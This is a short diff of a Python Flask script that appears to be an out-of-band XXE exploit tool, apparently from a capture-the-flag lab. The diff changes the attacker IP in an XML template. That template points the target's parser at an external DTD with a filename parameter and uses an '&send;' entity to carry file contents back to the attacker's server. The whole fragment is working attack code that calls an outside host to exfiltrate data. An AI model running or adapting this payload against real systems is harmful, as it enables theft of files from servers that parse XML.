@@ -15,7 +15,7 @@ app = Flask(__name__)
 prev_data = ""
 
 xml_template = """<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "http://10.10.14.6/dtd?fn={}">
+<!DOCTYPE data SYSTEM "http://10.10.14.8/dtd?fn={}">
 <data>&send;</data>"""
 
 @app.route("/dtd")
